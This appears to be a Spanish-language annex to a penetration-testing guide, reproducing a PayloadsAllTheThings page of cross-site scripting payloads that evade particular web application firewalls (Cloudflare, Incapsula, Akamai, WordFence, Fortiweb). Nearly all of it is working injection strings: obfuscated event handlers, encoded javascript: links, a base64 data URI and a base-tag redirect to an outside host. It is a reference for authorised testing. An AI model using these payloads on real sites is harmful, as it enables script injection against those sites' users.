# Cross-Site Scripting (XSS): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [XSS Injection/3 - XSS Common WAF Bypass.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Comunes Evasión de WAF / Cloudflare

```js
    <svg/onrandom=random onload=confirm(1)>
    <video onnull=null onmouseover=confirm(1)>
```

```js
    <svg/OnLoad="`${prompt``}`">
```

```js
    <svg/onload=%26nbsp;alert`bohdan`+
```

```js
    1'"><img/src/onerror=.1|alert``>
```

```js
    <svg onload=prompt%26%230000000040document.domain)>
    <svg onload=prompt%26%23x000000028;document.domain)>
    xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```

```js
    <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```

```html
    <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

## 2. Comunes Evasión de WAF / Chrome Auditor

```javascript
    </script><svg><script>alert(1)-%26apos%3B
```

## 3. Comunes Evasión de WAF / Incapsula WAF

```js
    <svg onload\r\n=$.globalEval("al"+"ert()");>
```

```javascript
    anythinglr00</script><script>alert(document.domain)</script>uxldz
    anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
```

```javascript
    <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```

## 4. Comunes Evasión de WAF / Akamai WAF

```javascript
    ?"></script><base%20c%3D=href%3Dhttps:\mysite>
```

```svg
    <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```

## 5. Comunes Evasión de WAF / WordFence WAF

```html
    <a href=javas&#99;ript:alert(1)>
```

## 6. Comunes Evasión de WAF / Fortiweb WAF

```javascript
    \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
